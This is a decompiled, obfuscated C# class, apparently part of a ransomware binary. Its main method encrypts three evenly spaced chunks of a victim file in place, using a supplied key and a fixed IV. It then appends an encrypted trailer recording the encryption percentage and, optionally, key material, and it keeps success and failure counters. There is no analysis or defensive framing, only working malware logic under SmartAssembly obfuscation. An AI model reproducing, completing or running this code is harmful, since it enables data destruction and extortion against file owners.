using System;
using System.IO;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using UiJYiNvGWeAgvdh;

namespace jtAYXTgtXeY;

internal sealed class bneaMJWUstJ
{
	[NonSerialized]
	internal static GetString getString_0;

	public static int PeebpZpeij(long long_0)
	{
		return (int)long_0;
	}

	public static bool xXulSKqBCHR(string XhQmdVazUIn, string JJKdnVrCSvp, string FEpVpRPuubZY, byte[] ACeKMNDvPgzpT = null)
	{
		try
		{
			using (FileStream fileStream = new FileStream(XhQmdVazUIn, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
			{
				int num = PeebpZpeij(fileStream.Length) / 3;
				if (num < 0)
				{
					num *= -1;
				}
				int num2 = 0;
				try
				{
					num2 = Convert.ToInt32(JJKdnVrCSvp) * Convert.ToInt32(fileStream.Length) / 100 / 2;
					if (num2 < 0)
					{
						num2 *= -1;
					}
				}
				catch
				{
					num2 = 107374182;
				}
				if (num <= num2 - Convert.ToInt32(JJKdnVrCSvp) * 1024 * 1024)
				{
					num2 = (num - Convert.ToInt32(JJKdnVrCSvp) * 1024 * 1024) / 10;
				}
				int qpJkNyuuYZuDWkB = (int)Math.Round((double)num2 / 32.0, MidpointRounding.AwayFromZero) * 32;
				byte[] array = null;
				for (int i = 0; i < 3; i++)
				{
					byte[] byte_ = qCHNoxWqHLqQj(XhQmdVazUIn, fileStream, qpJkNyuuYZuDWkB, num * i);
					array = (efoRmwagKuQD.CpKJVfXcbzad ? qYGhbgYMkFdbXtd.ytKbEkOaFFyA(byte_, Encoding.ASCII.GetBytes(FEpVpRPuubZY), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : gXMFgMIeYcrF.VFZJqJWFkaov(byte_, Encoding.ASCII.GetBytes(FEpVpRPuubZY), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }));
					oKDcUsCnKuuoV(XhQmdVazUIn, fileStream, array, num * i);
				}
			}
			byte[] array2 = null;
			array2 = (efoRmwagKuQD.csOkMUvFRZv ? Encoding.ASCII.GetBytes(efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107398198)) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399863)) + Convert.ToString(JJKdnVrCSvp) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399863))) : Encoding.ASCII.GetBytes(efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107398198)) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399840)) + Convert.ToString(JJKdnVrCSvp) + efoRmwagKuQD.UPTUMFgiFSZjXAR(getString_0(107399840))));
			if (!efoRmwagKuQD.csOkMUvFRZv)
			{
				using FileStream fileStream2 = new FileStream(XhQmdVazUIn, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream2.Write(array2, 0, array2.Length);
			}
			else
			{
				using FileStream fileStream3 = new FileStream(XhQmdVazUIn, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				fileStream3.Write(ACeKMNDvPgzpT, 0, ACeKMNDvPgzpT.Length);
				fileStream3.Write(array2, 0, array2.Length);
			}
		}
		catch (Exception ex)
		{
			if (efoRmwagKuQD.WkkVnLAdbtG)
			{
				try
				{
					File.AppendAllText(efoRmwagKuQD.PhOHjwgFpwoPkI, getString_0(107385294) + XhQmdVazUIn + getString_0(107398153) + ex.Message + getString_0(107396463));
				}
				catch (Exception)
				{
				}
			}
			efoRmwagKuQD.WuLujtLeXYYG++;
			return false;
		}
		efoRmwagKuQD.LFhiMkBTtnH++;
		return true;
	}

	public static byte[] qCHNoxWqHLqQj(string GyFzciDEEQVKTZ, FileStream jFNLJybWSCPibj, int qpJkNyuuYZuDWkB, int ZSSGQgkGfclr = 0)
	{
		byte[] array = new byte[qpJkNyuuYZuDWkB];
		jFNLJybWSCPibj.Position = ZSSGQgkGfclr;
		jFNLJybWSCPibj.Read(array, 0, qpJkNyuuYZuDWkB);
		return array;
	}

	public static void oKDcUsCnKuuoV(string EJcPSjDXRoYqtzF, FileStream xREJZKXYMPpD, byte[] hkiJLyMCFup, int mxrCCgQkEy = 0)
	{
		xREJZKXYMPpD.Position = mxrCCgQkEy;
		xREJZKXYMPpD.Write(hkiJLyMCFup, 0, hkiJLyMCFup.Length);
	}

	static bneaMJWUstJ()
	{
		Strings.CreateGetStringDelegate(typeof(bneaMJWUstJ));
	}
}
